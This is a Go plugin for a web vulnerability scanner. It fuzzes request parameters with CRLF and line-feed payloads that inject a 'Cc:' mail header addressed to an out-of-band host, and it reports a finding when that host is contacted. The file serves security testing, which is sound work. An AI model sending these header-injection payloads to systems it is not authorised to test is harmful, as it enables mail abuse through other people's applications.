package main

import (
    "net/http"
    "github.com/cfsdes/nucke/pkg/report"
    "github.com/cfsdes/nucke/pkg/plugins/fuzzers"
    "github.com/cfsdes/nucke/pkg/plugins/detections"
)


func Run(r *http.Request, client *http.Client, pluginDir string) (string, string, string, bool, string, error) {
    // Scan
    vulnFound, rawReq, url, rawResp := scan(r, client)

    // Report
    reportContent := report.ReadFileToString("report-template.md", pluginDir)
    summary := report.ParseTemplate(reportContent, map[string]interface{}{
        "request": rawReq,
    })
    
    return	"Medium", url, summary, vulnFound, rawResp, nil
}


// Running all Fuzzers
func scan(r *http.Request, client *http.Client) (bool, string, string, string) {
    
    // Format OOB URL

    // Call All Fuzzers (Except fuzzHeaders)
    payloads := []string{
        "{{.original}}\x0aCc:elvtnx@{{.oob}}",
        "{{.original}}\x0d\x0aCc:elvtnx@{{.oob}}",
    }

    matcher := detections.Matcher{OOB: true}

    fuzzers := []func(*http.Request, *http.Client, []string, detections.Matcher) (bool, string, string, string, string, string){
        fuzzers.FuzzJSON,
        fuzzers.FuzzQuery,
        fuzzers.FuzzFormData,
        fuzzers.FuzzXML,
    }

    for _, fuzzer := range fuzzers {
        if vulnFound, rawReq, url, _, _, rawResp := fuzzer(r, client, payloads, matcher); vulnFound {
            return vulnFound, rawReq, url, rawResp
        }
    }

    return false, "", "", ""
}
